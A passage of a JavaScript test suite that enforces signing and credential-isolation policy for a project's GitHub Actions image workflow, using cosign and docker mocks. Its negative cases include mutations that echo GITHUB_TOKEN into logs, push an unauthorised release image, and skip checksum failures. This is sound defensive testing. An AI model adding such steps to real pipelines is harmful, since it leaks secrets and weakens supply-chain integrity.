    ["duplicate install", s => s.unshift({ ...s[0] })],
    ["comment-only pin", s => { s[0].run = `# ${COSIGN_INSTALL_RUN.replaceAll("\n", "\n# ")}\necho not-installed`; }],
    ["old version", s => { s[0].run = s[0].run.replace("v3.1.4", "v3.0.6"); }],
    ["wrong checksum", s => { s[0].run = s[0].run.replace(COSIGN_SHA256, "0".repeat(64)); }],
    ["chmod before verification", s => { const lines = s[0].run.split("\n"); [lines[2], lines[3]] = [lines[3], lines[2]]; s[0].run = lines.join("\n"); }],
    ["execution before verification", s => { s[0].run = '"${RUNNER_TEMP}/cosign-bin/cosign" version\n' + s[0].run; }],
    ["ignored checksum failure", s => { s[0].run = s[0].run.replace(`${COSIGN_SHA256} "\${RUNNER_TEMP}/cosign-bin/cosign"`, `${COSIGN_SHA256} "\${RUNNER_TEMP}/cosign-bin/cosign" || true`); }],
    ["sign before install", s => s.reverse()],
    ["optional install", s => { s[0].if = "false"; }],
    ["ignored install failure", s => { s[0]["continue-on-error"] = true; }],
    ["optional signing", s => { s[1].if = "false"; }],
    ["ignored signing failure", s => { s[1]["continue-on-error"] = true; }],
    ["tag signing", s => { s[1].run = 'cosign sign --yes "${IMAGE}:latest"'; }],
    ["architecture digest signing", s => { s[1].env.DIGEST = "${{ needs.build.outputs.digest_linux_amd64 }}"; }],
  ];
  for (const [name, mutate] of mutations) {
    const data = structuredClone(fixture);
    mutate(data.jobs.publish.steps);
    assert.throws(() => assertCosignPublishPolicy(data), { name: "AssertionError" }, name);
  }
});

// Explicit manual acceptance is isolated from every normal publisher path.
const PROBE_IF = "github.event_name == 'workflow_dispatch' && inputs.acceptance_probe == true";
const PROBE_META_IF = "(github.ref == 'refs/heads/main' || startsWith(github.ref, 'refs/tags/v')) && !(github.event_name == 'workflow_dispatch' && inputs.acceptance_probe == true)";
const probeStep = (data, job, name) => {
  const matches = stepsOf(data.jobs[job]).filter(s => s.name === name);
  assert.equal(matches.length, 1, `${job}: required singleton step ${name}`);
  return matches[0];
};
const PROBE_GUARD = [
  "set -euo pipefail",
  '[[ "${EVENT}" = workflow_dispatch && "${PROBE}" = true ]]',
  '[[ "${GITHUB_REPOSITORY}" = ncecere/open-model-gateway && "${IMAGE}" = ghcr.io/ncecere/open-model-gateway ]]',
  '[[ "${REF_TYPE}" = branch && "${GITHUB_REF}" = refs/heads/?* && "${GITHUB_REF}" != refs/heads/main ]]',
  '[[ "${GITHUB_SHA}" =~ ^[0-9a-f]{40}$ && "${GITHUB_WORKFLOW_SHA}" = "${GITHUB_SHA}" ]]',
].join("\n");
const PROBE_DIGEST_GUARD = [
  '[[ "${DIGEST}" =~ ^sha256:[0-9a-f]{64}$ && "${CHILD}" =~ ^sha256:[0-9a-f]{64}$ && "${CHILD}" != "${DIGEST}" ]]',
].join("\n");
const PROBE_AUTH = [
  "set -euo pipefail", "umask 077", "export DOCKER_CONFIG",
  'DOCKER_CONFIG=$(mktemp -d "${RUNNER_TEMP}/probe-auth.XXXXXXXX")',
  'echo "DOCKER_CONFIG=${DOCKER_CONFIG}" >> "$GITHUB_ENV"',
  'printf \'%s\' "${GITHUB_TOKEN}" | docker login ghcr.io --username "${GITHUB_ACTOR}" --password-stdin',
].join("\n");
const PROBE_CLEANUP = [
  'if [ -n "${DOCKER_CONFIG:-}" ] && [ -d "${DOCKER_CONFIG}" ]; then',
  '  trap \'rm -rf -- "${DOCKER_CONFIG}"\' EXIT',
  '  docker logout ghcr.io',
  'fi',
].join("\n");

function assertProbePolicy(data) {
  assert.deepEqual(data.on.workflow_dispatch.inputs, { acceptance_probe: {
    description: "Sign and verify only this non-main branch's existing dev index (no normal publication)",
    type: "boolean", required: false, default: false,
  } });
  assert.equal(data.on.workflow_call.inputs, undefined, "reusable callers cannot activate the probe");
  assert.equal(data.jobs.meta.if, PROBE_META_IF);
  assert.deepEqual(data.env, { IMAGE: "ghcr.io/ncecere/open-model-gateway" });
  for (const name of ["probe-prepare", "probe-sign", "probe-verify"]) {
    const job = data.jobs[name];
    assert.ok(job, `${name} must exist`);
    assert.equal(job.if, PROBE_IF);
    assert.equal(job["runs-on"], "ubuntu-24.04");
    assert.equal(job["timeout-minutes"], 10);
    assert.equal(job["continue-on-error"], undefined);
    assert.equal(job.defaults, undefined);
    assert.equal(job.strategy, undefined);
    assert.deepEqual(job.permissions, name === "probe-sign"
      ? { contents: "read", packages: "write", "id-token": "write" }
      : { contents: "read", packages: "read" });
    const expectedEnv = { EVENT: "${{ github.event_name }}", PROBE: "${{ inputs.acceptance_probe }}", REF_TYPE: "${{ github.ref_type }}" };
    if (name !== "probe-prepare") Object.assign(expectedEnv, {
      DIGEST: "${{ needs.probe-prepare.outputs.digest }}", CHILD: "${{ needs.probe-prepare.outputs.child }}",
    });
    assert.deepEqual(job.env, expectedEnv);
    assert.deepEqual(job.needs, name === "probe-prepare" ? undefined : name === "probe-sign" ? ["probe-prepare"] : ["probe-prepare", "probe-sign"]);
    const steps = stepsOf(job);
    assert.equal(steps[0].name, "Refuse anything except this branch's explicit probe");
    assert.equal(steps[0].run.trim(), name === "probe-prepare" ? PROBE_GUARD : `${PROBE_GUARD}\n${PROBE_DIGEST_GUARD}`);
    const checkout = steps.filter(s => actionName(s.uses) === "actions/checkout");
    assert.equal(checkout.length, 1);
    assert.deepEqual(checkout[0].with, { ref: "${{ github.workflow_sha }}", "persist-credentials": false });
    assert.equal(steps[1], checkout[0]);
    for (const step of steps) {
      assert.equal(step["continue-on-error"], undefined);
      assert.equal(step.shell, undefined);
      assert.equal(step.if, step.name === "Remove probe credentials" ? "always()" : undefined);
      assert.doesNotMatch(step.run ?? "", /\$\{\{/, "no expression interpolation into shell programs");
    }
    const auth = probeStep(data, name, "Authenticate privately with native Docker");
    assert.equal(auth.run.trim(), PROBE_AUTH);
    assert.deepEqual(auth.env, { GITHUB_TOKEN: "${{ secrets.GITHUB_TOKEN }}" });
    assert.equal(probeStep(data, name, "Remove probe credentials").run.trim(), PROBE_CLEANUP);
    assert.doesNotMatch(executable(job), /imagetools create|docker (?:push|build)\b|gh release|github-release|--recursive|--tag\b|latest-release/);
    if (name !== "probe-prepare") assert.doesNotMatch(executable(job), /:dev-/, "only the read-only preparation may resolve a dev tag");
    assert.ok(steps.indexOf(auth) > 1);
    if (name !== "probe-prepare") {
      const installer = probeStep(data, name, COSIGN_INSTALL_NAME);
      assert.equal(installer.run.trim(), COSIGN_INSTALL_RUN);
      assert.ok(steps.indexOf(installer) < steps.indexOf(auth), "verified installer precedes credentials");
      assert.doesNotMatch(executable(job), /docker (?:run|pull)\b|npm|cargo|trivy|staging/);
    }
  }
  const prepare = data.jobs["probe-prepare"];
  assert.deepEqual(prepare.outputs, { digest: "${{ steps.resolve.outputs.digest }}", child: "${{ steps.resolve.outputs.child }}" });
  const resolve = probeStep(data, "probe-prepare", "Resolve and pull the existing dev index (no retry or rebuild)");
  assert.equal(resolve.id, "resolve");
  assert.equal(resolve.env, undefined);
  assert.match(resolve.run, /tag="\$\{IMAGE\}:dev-\$\{GITHUB_SHA:0:12\}"/);
  assert.match(resolve.run, /docker buildx imagetools inspect "\$\{tag\}" --format '\{\{json \.Manifest\}\}'/);
  assert.match(resolve.run, /docker buildx imagetools inspect --raw "\$\{IMAGE\}@\$\{digest\}"/);
  assert.match(resolve.run, /docker pull --platform linux\/amd64 "\$\{IMAGE\}@\$\{child\}"/);
  assert.match(resolve.run, /\[ "\$\{child\}" != "\$\{digest\}" \]/);
  assert.match(resolve.run, /echo "digest=\$\{digest\}" >> "\$GITHUB_OUTPUT"/);
  assert.match(resolve.run, /echo "child=\$\{child\}" >> "\$GITHUB_OUTPUT"/);
  const erase = probeStep(data, "probe-prepare", "Remove probe credentials");
  const version = probeStep(data, "probe-prepare", "Check exact revision, native platform and Cargo version without credentials");
  assert.ok(prepare.steps.indexOf(erase) < prepare.steps.indexOf(version));
  assert.match(version.run, /\[ ! -d "\$\{DOCKER_CONFIG\}" \]/);
  assert.match(version.run, /docker run --rm --network none --read-only --cap-drop ALL --security-opt no-new-privileges "\$\{IMAGE\}@\$\{CHILD\}" --version/);
  assert.equal(version.env.CHILD, "${{ steps.resolve.outputs.child }}");
  assert.equal(probeStep(data, "probe-sign", "Sign only the prepared index").run.trim(), `set -euo pipefail\n${COSIGN_SIGN_RUN}`);
  const verify = probeStep(data, "probe-verify", "Verify exact root and expected refusals");
  assert.match(verify.run, /identity="https:\/\/github.com\/\$\{GITHUB_REPOSITORY\}\/\.github\/workflows\/image.yml@\$\{GITHUB_REF\}"/);
  assert.match(verify.run, /issuer=https:\/\/token.actions.githubusercontent.com/);
  assert.match(verify.run, /cosign verify --certificate-identity "\$\{identity\}" --certificate-oidc-issuer "\$\{issuer\}" "\$\{IMAGE\}@\$\{DIGEST\}"/);
  assert.match(verify.run, /cosign download signature "\$\{IMAGE\}@\$\{DIGEST\}"/);
  assert.match(verify.run, /cosign verify-blob --bundle \.\/bundle.json/);
  assert.match(verify.run, /failed to verify signature: provided artifact digest does not match any digest in statement/);
  assert.doesNotMatch(verify.run, /no signatures found|no matching attestations|--ignore|--insecure|--offline|--new-bundle-format/);
  assert.match(verify.run, /jq -e --arg digest "\$\{DIGEST\}"/);
  assert.match(verify.run, /\.critical\.image\["docker-manifest-digest"\] == \$digest/);
  assert.match(verify.run, /refuse "\$\{DIGEST\}" "\$\{identity\/image.yml\/wrong-workflow.yml\}" "\$\{issuer\}"/);
  assert.match(verify.run, /refuse "\$\{DIGEST\}" "\$\{identity\}" https:\/\/wrong-issuer.invalid/);
  assert.match(verify.run, /refuse "\$\{CHILD\}" "\$\{identity\}" "\$\{issuer\}"/);
  for (const name of ["meta", "build", "import-amd64", "import-arm64", "verify", "publish", "release"]) {
    assert.doesNotMatch(JSON.stringify(data.jobs[name].needs ?? []), /probe/);
  }
}

test("explicit manual cosign acceptance has isolated, failure-propagating parsed workflow boundaries (#375)", () => {
  assertProbePolicy(publicationData().image);
});

test("actual parsed meta guard preserves normal main/tag truth table and excludes manual probes (#375)", () => {
  const data = publicationData().image;
  assert.equal(data.jobs.meta.if, PROBE_META_IF);
  for (const event_name of ["push", "workflow_call", "workflow_dispatch"]) {
    for (const ref of ["refs/heads/main", "refs/heads/issue/375-signing-acceptance", "refs/tags/v0.9.1", "refs/tags/other", "refs/pull/1/merge"]) {
      for (const acceptance_probe of [false, true, undefined]) {
        const context = { github: { ref, event_name }, inputs: { acceptance_probe }, startsWith: (s, prefix) => s.startsWith(prefix) };
        const explicit = event_name === "workflow_dispatch" && acceptance_probe === true;
        assert.equal(runInNewContext(data.jobs.meta.if, context), (ref === "refs/heads/main" || ref.startsWith("refs/tags/v")) && !explicit);
        assert.equal(runInNewContext(data.jobs["probe-prepare"].if, context), explicit);
      }
    }
  }
});

test("probe boundary policy rejects widened inputs, authority, handoffs, optional guards and hidden publication (#375)", () => {
  const original = publicationData().image;
  assertProbePolicy(original);
  const step = (d, job, name) => probeStep(d, job, name);
  const mutations = [
    d => { d.on.workflow_dispatch.inputs.acceptance_probe.default = true; },
    d => { d.on.workflow_dispatch.inputs.root_digest = { type: "string" }; },
    d => { d.on.workflow_call.inputs = { acceptance_probe: { type: "boolean" } }; },
    d => { d.jobs.meta.if = "github.ref == 'refs/heads/main'"; },
    ...["probe-prepare", "probe-sign", "probe-verify"].flatMap(job => [
      d => { d.jobs[job].if = "always()"; },
      d => { d.jobs[job]["continue-on-error"] = true; },
      d => { d.jobs[job].steps[0].if = "false"; },
      d => { d.jobs[job].steps[0].run += " || true"; },
      d => { d.jobs[job].steps[1].with.ref = "${{ github.sha }}"; },
      d => { step(d, job, "Remove probe credentials").if = "success()"; },
      d => { step(d, job, "Remove probe credentials").run = "docker logout ghcr.io"; },
      d => { step(d, job, "Authenticate privately with native Docker").run += '\necho "${GITHUB_TOKEN}"'; },
      d => { d.jobs[job].steps.push({ run: "docker push ghcr.io/ncecere/open-model-gateway:latest-release" }); },
    ]),
    d => { d.jobs["probe-prepare"].permissions.packages = "write"; },
    d => { d.jobs["probe-verify"].permissions["id-token"] = "write"; },
    d => { d.jobs["probe-sign"].permissions.contents = "write"; },
    d => { d.jobs["probe-sign"].needs = []; },
    d => { d.jobs["probe-verify"].needs.pop(); },
    d => { d.jobs.publish.needs.push("probe-sign"); },
    d => { d.jobs["probe-sign"].env.DIGEST = "${{ inputs.digest }}"; },
    d => { d.jobs["probe-prepare"].outputs.digest = "${{ steps.resolve.outputs.child }}"; },
    ...["probe-sign", "probe-verify"].flatMap(job => [
      d => { step(d, job, COSIGN_INSTALL_NAME).run = COSIGN_INSTALL_RUN.replace(COSIGN_SHA256, "0".repeat(64)); },
      d => { step(d, job, COSIGN_INSTALL_NAME).run = 'cosign version\n' + COSIGN_INSTALL_RUN; },
    ]),
    d => { step(d, "probe-sign", "Sign only the prepared index").run = COSIGN_SIGN_RUN + " --recursive"; },
    d => { d.jobs["probe-prepare"].steps.push({ run: 'docker buildx imagetools create --tag "${IMAGE}:dev-${GITHUB_SHA:0:12}" "${IMAGE}@${DIGEST}"' }); },
  ];
  for (const mutate of mutations) {
    const data = structuredClone(original);
    mutate(data);
    assert.throws(() => assertProbePolicy(data), { name: "AssertionError" });
  }
});

// Native command stand-ins only: never execute Docker, a downloaded tool, or a network client.
// These fixtures model CLI contracts and source-defined errors, NOT cryptography.
const PROBE_BUNDLE_MEDIA = "application/vnd.dev.sigstore.bundle.v0.3+json";
const probeBundle = (marker = "fixture-payload") => ({
  mediaType: PROBE_BUNDLE_MEDIA, dsseEnvelope: { payload: marker, payloadType: "application/vnd.in-toto+json", signatures: [] },
  verificationMaterial: { fixtureOnly: true },
});
function probeFixture() {
  const dir = mkdtempSync(join(tmpdir(), "cosign-probe-policy-"));
  const bin = join(dir, "bin");
  mkdirSync(bin);
  const env = {
    PATH: `${bin}:${process.env.PATH}`, HOME: dir, RUNNER_TEMP: dir,
    GITHUB_ENV: join(dir, "env"), GITHUB_OUTPUT: join(dir, "output"),
    EVENT: "workflow_dispatch", PROBE: "true", REF_TYPE: "branch",
    GITHUB_REF: "refs/heads/issue/375-signing-acceptance", GITHUB_SHA: "a".repeat(40), GITHUB_WORKFLOW_SHA: "a".repeat(40),
    GITHUB_REPOSITORY: "ncecere/open-model-gateway", IMAGE: "ghcr.io/ncecere/open-model-gateway", GITHUB_ACTOR: "probe-fixture",
    DIGEST: `sha256:${"b".repeat(64)}`, CHILD: `sha256:${"c".repeat(64)}`,
    FIXTURE_DIR: dir,
    REPORTED_VERSION: `open-model-gateway ${readFileSync(join(root, "apps/gateway/Cargo.toml"), "utf8").match(/^version = "([^"]+)"$/m)[1]}`,
  };
  const mock = `#!${process.execPath}
const fs = require('node:fs');
const path = require('node:path');
const e = process.env, a = process.argv.slice(2), command = path.basename(process.argv[1]);
fs.appendFileSync(path.join(e.FIXTURE_DIR, 'calls'), JSON.stringify([command, ...a]) + '\\n');
const fail = (message, code = 1) => { console.error(message); process.exit(code); };
if (command === 'docker') {
  if (a[0] === 'login') {
    if (fs.readFileSync(0, 'utf8') !== 'fixture-read-token') fail('missing stdin credential');
    fs.writeFileSync(path.join(e.DOCKER_CONFIG, 'config.json'), 'fixture-private-auth');
  } else if (a[0] === 'logout') {
    if (e.FAIL_LOGOUT) fail('fixture logout failure');
    fs.rmSync(path.join(e.DOCKER_CONFIG, 'config.json'), { force: true });
  } else if (a.slice(0, 3).join(' ') === 'buildx imagetools inspect') {
    if (e.FAIL_RESOLVE) fail('dev tag not ready');
    console.log(a.includes('--raw') ? fs.readFileSync(path.join(e.FIXTURE_DIR, 'index.json'), 'utf8') : JSON.stringify({ digest: e.DIGEST }));
  } else if (a[0] === 'pull') {
    if (e.FAIL_PULL) fail('fixture pull failure');
  } else if (a.slice(0, 2).join(' ') === 'image inspect') {
    console.log(e.CONFIG_JSON || JSON.stringify([{ Os: 'linux', Architecture: 'amd64', Config: { Labels: { 'org.opencontainers.image.revision': e.GITHUB_SHA } } }]));
  } else if (a[0] === 'run') {
    if (fs.existsSync(e.DOCKER_CONFIG) || e.GITHUB_TOKEN) fail('image sees registry credentials');
    console.log(e.REPORTED_VERSION ?? '');
  } else fail('unexpected Docker command');
} else if (command === 'cosign') {
  if (a.slice(0, 2).join(' ') === 'download signature') {
    if (a.length !== 3 || a[2] !== e.IMAGE + '@' + e.DIGEST) fail('download must use the exact root');
    if (e.DOWNLOAD_ERROR) fail(e.DOWNLOAD_ERROR);
    process.stdout.write(fs.readFileSync(path.join(e.FIXTURE_DIR, 'download.jsonl')), () => process.exit(0));
    return;
  }
  if (!['verify', 'verify-blob'].includes(a[0])) fail('local signing is forbidden');
  const artifact = a.at(-1), identity = a[a.indexOf('--certificate-identity') + 1], issuer = a[a.indexOf('--certificate-oidc-issuer') + 1];
  const local = a[0] === 'verify-blob';
  if (local) {
    const cwd = process.cwd(), bundlePath = a[a.indexOf('--bundle') + 1];
    if (bundlePath !== './bundle.json' || fs.readdirSync(cwd).join() !== 'bundle.json') fail('bundle verification needs a fresh isolated directory');
    if ((fs.statSync(cwd).mode & 0o777) !== 0o700 || (fs.statSync(bundlePath).mode & 0o777) !== 0o600) fail('bundle data is not private');
    if (!/^sha256:[0-9a-f]{64}$/.test(artifact) || fs.existsSync(artifact)) fail('expected a digest, not a file');
    const bundle = fs.readFileSync(bundlePath, 'utf8');
    fs.appendFileSync(path.join(e.FIXTURE_DIR, 'blob-calls'), JSON.stringify({ cwd, bundle, artifact, identity, issuer }) + '\\n');
    if (!['fixture-payload', 'fixture-second'].includes(JSON.parse(bundle).dsseEnvelope.payload)) fail('fixture tampered payload or bad digest');
  }
  const negative = artifact.endsWith(e.CHILD) || identity.includes('wrong-workflow') || issuer.includes('wrong-issuer');
  if (negative && e.NEGATIVE_MODE === 'success') { console.log('[]'); process.exit(0); }
  if (negative && e.NEGATIVE_MODE === 'network') fail('Get https://ghcr.io/v2/: connection reset');
  if (negative && e.NEGATIVE_MODE === 'mixed') fail('no signatures found\\nGet https://ghcr.io/v2/: connection reset');
  if (negative) {
    const actualIdentity = 'https://github.com/' + e.GITHUB_REPOSITORY + '/.github/workflows/image.yml@' + e.GITHUB_REF;
    let message;
    if (artifact.endsWith(e.CHILD)) message = e.CHILD_ERROR || (local
      ? 'failed to verify signature: provided artifact digest does not match any digest in statement' : 'no signatures found');
    else {
      const detail = identity.includes('wrong-workflow')
        ? 'expected SAN value "' + identity + '", got "' + actualIdentity + '"'
        : 'expected issuer value "' + issuer + '", got "https://token.actions.githubusercontent.com"';
      const supplied = identity.includes('wrong-workflow') ? e.IDENTITY_ERROR : e.ISSUER_ERROR;
      message = supplied || (local ? '' : 'no matching attestations: ') + 'failed to verify certificate identity: no matching CertificateIdentity found, last error: ' + detail;
    }
    if (e.NEGATIVE_MODE === 'policy-mixed') message += '\\nGet https://ghcr.io/v2/: connection reset';
    // Observed pinned Cosign stderr has a bare main.go logger; retain dated compatibility.
    // Stand-ins exercise control flow only, never cryptographic verification.
    const logger = (e.DATED ? '2026/10/26 12:00:00 ' : '') + 'error during command execution: ';
    fail((e.ERROR_PREFIX ?? 'Error: ') + message + (e.ERROR_SUFFIX || '') + '\\n' + (e.LOGGER_PREFIX ?? logger) + message);
  }
  if (local) {
    if (e.LOCAL_POSITIVE_ERROR) fail(e.LOCAL_POSITIVE_ERROR);
    console.error('Verified OK');
  } else {
    if (e.ONLINE_ERROR) fail(e.ONLINE_ERROR);
    console.log(e.PAYLOAD_JSON || JSON.stringify([{ critical: { image: { 'docker-manifest-digest': e.DIGEST } } }]));
  }
} else fail('unexpected executable');
`;
  for (const name of ["docker", "cosign"]) { writeFileSync(join(bin, name), mock); chmodSync(join(bin, name), 0o755); }
  const child = { mediaType: "application/vnd.oci.image.manifest.v1+json", digest: env.CHILD, size: 100, platform: { os: "linux", architecture: "amd64" } };
  const index = { schemaVersion: 2, mediaType: "application/vnd.oci.image.index.v1+json", manifests: [child, {
    ...child, digest: `sha256:${"d".repeat(64)}`, platform: { os: "unknown", architecture: "unknown" },
    annotations: { "vnd.docker.reference.type": "attestation-manifest", "vnd.docker.reference.digest": env.CHILD },
  }] };
  writeFileSync(join(dir, "index.json"), JSON.stringify(index));
  writeFileSync(join(dir, "download.jsonl"), JSON.stringify(probeBundle()) + "\n");
  writeFileSync(env.GITHUB_ENV, ""); writeFileSync(env.GITHUB_OUTPUT, "");
  const run = (script, overrides = {}, cwd = root) => runBash(["--noprofile", "--norc", "-e", "-o", "pipefail", "-c", script], {
    cwd, env: { ...env, ...overrides }, encoding: "utf8", timeout: 10_000,
  });
  const calls = () => existsSync(join(dir, "calls")) ? readFileSync(join(dir, "calls"), "utf8").trim().split("\n").filter(Boolean).map(JSON.parse) : [];
  const authenticate = script => {
    const result = run(script, { GITHUB_TOKEN: "fixture-read-token" });
    const match = [...readFileSync(env.GITHUB_ENV, "utf8").matchAll(/^DOCKER_CONFIG=(.+)$/gm)].at(-1);
    if (match) env.DOCKER_CONFIG = match[1];
    return result;
  };
  return { dir, env, run, calls, authenticate, index, cleanup: () => rmSync(dir, { recursive: true, force: true }) };
}

test("actual probe branch/digest guards refuse main, tags, invalid SHAs and reusable activation before credentials (#375)", () => {
  const data = publicationData().image;
  for (const job of ["probe-prepare", "probe-sign", "probe-verify"]) {
    const script = probeStep(data, job, "Refuse anything except this branch's explicit probe").run;
    const f = probeFixture();
    try {
      assert.equal(f.run(script).status, 0);
      for (const bad of [
        { EVENT: "workflow_call" }, { EVENT: "push" }, { PROBE: "false" }, { PROBE: "" },
        { GITHUB_REF: "refs/heads/main" }, { REF_TYPE: "tag", GITHUB_REF: "refs/tags/v0.9.0" },
        { GITHUB_REF: "refs/pull/1/merge" }, { GITHUB_REF: "refs/heads/" }, { REF_TYPE: "other" },
        { GITHUB_REPOSITORY: "other/repository" }, { IMAGE: "ghcr.io/other/image" },
        { GITHUB_SHA: "main" }, { GITHUB_SHA: "a".repeat(12) }, { GITHUB_SHA: "A".repeat(40) },
        { GITHUB_WORKFLOW_SHA: "b".repeat(40) },
        ...(job === "probe-prepare" ? [] : [{ DIGEST: "latest" }, { CHILD: "sha256:bad" }, { CHILD: f.env.DIGEST }]),
      ]) assert.notEqual(f.run(script, bad).status, 0, `${job}: ${JSON.stringify(bad)}`);
      assert.deepEqual(f.calls(), []);
    } finally { f.cleanup(); }
  }
});

test("actual probe version fixtures follow Cargo and retain exact-version refusals across releases (#379)", () => {
  const data = publicationData().image;
  const script = probeStep(data, "probe-prepare", "Check exact revision, native platform and Cargo version without credentials").run;
  const f = probeFixture();
  try {
    const packageVersion = readFileSync(join(root, "apps/gateway/Cargo.toml"), "utf8").match(/^version = "([^"]+)"$/m)[1];
    assert.equal(f.env.REPORTED_VERSION, `open-model-gateway ${packageVersion}`);
    assert.equal(f.authenticate(PROBE_AUTH).status, 0);
    assert.equal(f.run(probeStep(data, "probe-prepare", "Remove probe credentials").run).status, 0);
    const cwd = join(f.dir, "version-root");
    mkdirSync(join(cwd, "apps/gateway"), { recursive: true });
    for (const version of ["0.9.0", "0.9.1", "2.0.0-rc.1"]) {
      writeFileSync(join(cwd, "apps/gateway/Cargo.toml"), `[package]\nversion = "${version}"\n`);
      assert.equal(f.run(script, { REPORTED_VERSION: `open-model-gateway ${version}` }, cwd).status, 0);
      for (const REPORTED_VERSION of ["open-model-gateway 0.0.0", ""]) {
        assert.notEqual(f.run(script, { REPORTED_VERSION }, cwd).status, 0);
      }
    }
  } finally { f.cleanup(); }
});

test("actual probe preparation selects one bound AMD child and removes credentials before native --version (#375)", () => {
  const data = publicationData().image;
  const resolve = probeStep(data, "probe-prepare", "Resolve and pull the existing dev index (no retry or rebuild)").run;
  const version = probeStep(data, "probe-prepare", "Check exact revision, native platform and Cargo version without credentials").run;
  const erase = probeStep(data, "probe-prepare", "Remove probe credentials").run;
  const f = probeFixture();
  try {
    assert.equal(f.authenticate(PROBE_AUTH).status, 0);
    const result = f.run(resolve);
    assert.equal(result.status, 0, result.stderr);
    assert.equal(readFileSync(f.env.GITHUB_OUTPUT, "utf8"), `digest=${f.env.DIGEST}\nchild=${f.env.CHILD}\n`);
    assert.equal(f.run(erase).status, 0);
    assert.equal(existsSync(f.env.DOCKER_CONFIG), false);
    assert.equal(f.run(version).status, 0);
    for (const CONFIG_JSON of [
      [], [{ Os: "linux", Architecture: "arm64" }],
      [{ Os: "linux", Architecture: "amd64", Config: { Labels: { "org.opencontainers.image.revision": "b".repeat(40) } } }],
    ].map(JSON.stringify)) assert.notEqual(f.run(version, { CONFIG_JSON }).status, 0);
    assert.notEqual(f.run(version, { REPORTED_VERSION: "open-model-gateway 0.0.0" }).status, 0);
    for (const mutate of [
      i => { i.manifests.push(i.manifests[0]); }, i => { i.manifests = [i.manifests[1]]; },
      i => { i.manifests[0].platform.architecture = "arm64"; }, i => { i.manifests[0].digest = "latest"; },
      i => { i.manifests[0].digest = f.env.DIGEST; }, i => { i.manifests[1].platform.os = "linux"; },
      i => { delete i.manifests[1].annotations; }, i => { i.manifests[1].annotations["vnd.docker.reference.digest"] = f.env.DIGEST; },
      i => { i.mediaType = "application/vnd.oci.image.manifest.v1+json"; }, i => { i.manifests[0].size = "100"; },
    ]) {
      const index = structuredClone(f.index); mutate(index);
      writeFileSync(join(f.dir, "index.json"), JSON.stringify(index));
      writeFileSync(f.env.GITHUB_OUTPUT, "");
      assert.notEqual(f.run(resolve).status, 0, JSON.stringify(index));
      assert.equal(readFileSync(f.env.GITHUB_OUTPUT, "utf8"), "");
    }
    for (const name of ["probe-prepare", "probe-sign", "probe-verify"]) {
      assert.equal(f.authenticate(PROBE_AUTH).status, 0);
      assert.notEqual(f.run(probeStep(data, name, "Remove probe credentials").run, { FAIL_LOGOUT: "1" }).status, 0);
      assert.equal(existsSync(f.env.DOCKER_CONFIG), false, "logout failure still deletes private credentials");
    }
    assert.ok(f.calls().every(([, ...args]) => !args.join(" ").includes("fixture-read-token")));
  } finally { f.cleanup(); }
});

test("actual probe CLI verification checks typed root claims and only specific negative refusal reasons (#375)", () => {
  const script = probeStep(publicationData().image, "probe-verify", "Verify exact root and expected refusals").run;
  const f = probeFixture();
  try {
    assert.equal(f.run(script).status, 0);
    const commands = f.calls().filter(c => c[0] === "cosign");
    assert.deepEqual(commands.map(c => c[1]), ["verify", "download", "verify-blob", "verify-blob", "verify-blob", "verify-blob"]);
    assert.deepEqual(commands[1], ["cosign", "download", "signature", f.env.IMAGE + "@" + f.env.DIGEST]);
    for (const PAYLOAD_JSON of [
      "[]", "{}", "null", "not-json", '[{"critical":{"image":{"docker-manifest-digest":"wrong"}}}]',
      JSON.stringify([{ critical: { image: { "docker-manifest-digest": f.env.DIGEST } } }, {}]),
    ]) assert.notEqual(f.run(script, { PAYLOAD_JSON }).status, 0, PAYLOAD_JSON);
    for (const bad of [
      { NEGATIVE_MODE: "success" }, { NEGATIVE_MODE: "network" }, { NEGATIVE_MODE: "mixed" }, { NEGATIVE_MODE: "policy-mixed" },
      { IDENTITY_ERROR: "unauthorized" }, { ISSUER_ERROR: "no signatures found" },
      { CHILD_ERROR: "manifest unknown: 404 Not Found" }, { CHILD_ERROR: "no matching signatures: certificate identity mismatch" },
    ]) assert.notEqual(f.run(script, bad).status, 0, JSON.stringify(bad));
  } finally { f.cleanup(); }
});

for (const DATED of ["", "1"]) test(`actual probe accepts exact refusal leaves with ${DATED ? "dated" : "observed bare (no date)"} logger (#375)`, () => {
  const script = probeStep(publicationData().image, "probe-verify", "Verify exact root and expected refusals").run;
  const f = probeFixture();
  try {
    const result = f.run(script, { DATED });
    assert.equal(result.status, 0, result.stderr);
    assert.deepEqual(f.calls().filter(c => c[0] === "cosign").map(c => c[1]),
      ["verify", "download", "verify-blob", "verify-blob", "verify-blob", "verify-blob"]);
  } finally { f.cleanup(); }
});

test("actual probe refuses nested/composite wrappers, unexpected prefixes, CR and extra blank lines (#375)", () => {
  const script = probeStep(publicationData().image, "probe-verify", "Verify exact root and expected refusals").run;
  for (const DATED of ["", "1"]) for (const bad of [
    { ERROR_PREFIX: "Error: Error: " },
    { ERROR_PREFIX: "Error: error during command execution: " },
    { ERROR_PREFIX: "Error: 2026/10/26 12:00:00 error during command execution: " },
    { LOGGER_PREFIX: "error during command execution: Error: " },
    { LOGGER_PREFIX: "error during command execution: error during command execution: " },
    { LOGGER_PREFIX: "2026/10/26 12:00:00 error during command execution: Error: " },
    { ERROR_PREFIX: "unexpected: " }, { LOGGER_PREFIX: "INFO: error during command execution: " },
    { ERROR_PREFIX: " Error: " }, { ERROR_PREFIX: "\u001b[31mError: " },
    { ERROR_SUFFIX: "\r" }, { ERROR_SUFFIX: "\n" }, { ERROR_PREFIX: "\nError: " },
    { NEGATIVE_MODE: "policy-mixed" },
  ]) {
    const f = probeFixture();
    try {
      assert.notEqual(f.run(script, { DATED, ...bad }).status, 0, JSON.stringify({ DATED, ...bad }));
    } finally { f.cleanup(); }
  }
});

test("collapsed child discovery 'no signatures found' is never artifact-binding proof (#375)", () => {
  const script = probeStep(publicationData().image, "probe-verify", "Verify exact root and expected refusals").run;
  const f = probeFixture();
  try {
    // GetBundles can swallow a transport error and fall back to this exact text.
    assert.notEqual(f.run(script, { CHILD_ERROR: "no signatures found" }).status, 0);
  } finally { f.cleanup(); }
});

test("download gate refuses empty, legacy, malformed, wrong-media, oversized and excess root bundles (#375)", () => {
  const script = probeStep(publicationData().image, "probe-verify", "Verify exact root and expected refusals").run;
  const invalid = [
    ["empty", ""], ["whitespace", " \n"], ["malformed", "{"], ["null", "null"], ["array", "[]"],
    ["legacy", JSON.stringify({ Base64Signature: "fixture", Payload: "fixture", Cert: "fixture" })],
    ["wrong media", JSON.stringify({ ...probeBundle(), mediaType: "application/vnd.dev.sigstore.bundle+json;version=0.3" })],
